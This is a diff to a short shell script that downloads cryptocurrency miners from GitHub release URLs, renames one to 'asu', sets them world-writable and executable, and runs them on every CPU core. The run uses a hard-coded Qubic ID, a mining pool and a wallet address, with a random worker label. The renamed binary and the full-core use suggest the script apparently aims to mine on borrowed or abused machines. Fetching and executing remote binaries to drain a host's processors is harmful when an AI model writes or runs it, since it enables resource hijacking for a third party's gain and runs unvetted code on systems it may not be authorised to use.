@@ -2,6 +2,6 @@
 lscpu
 wget -O asu https://github.com/bondaltomason/meo/releases/download/2.7.0/SRBMiner-MULTI
 chmod 777 asu
-wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.1.2/rqiner-x86-broadwell -O rqiner
-chmod 777 rqiner
-./rqiner -t $(nproc --all) -i QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -l $(echo $RANDOM | md5sum | head -c 10) --idle-command "./asu --algorithm verushash --pool sg.vipor.net:5040 --wallet R9awxso5wUdcZMCMGMrsv4NkQSSJL5ALMo.x --password x --cpu-threads $(nproc --all)"
+wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.1.2-experimental/rqiner-x86 -O rqiners
+chmod 777 rqiners
+./rqiners -t $(nproc --all) -i QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -l $(echo $RANDOM | md5sum | head -c 10) --idle-command "./asu --algorithm verushash --pool sg.vipor.net:5040 --wallet R9awxso5wUdcZMCMGMrsv4NkQSSJL5ALMo.x --password x --cpu-threads $(nproc --all)"
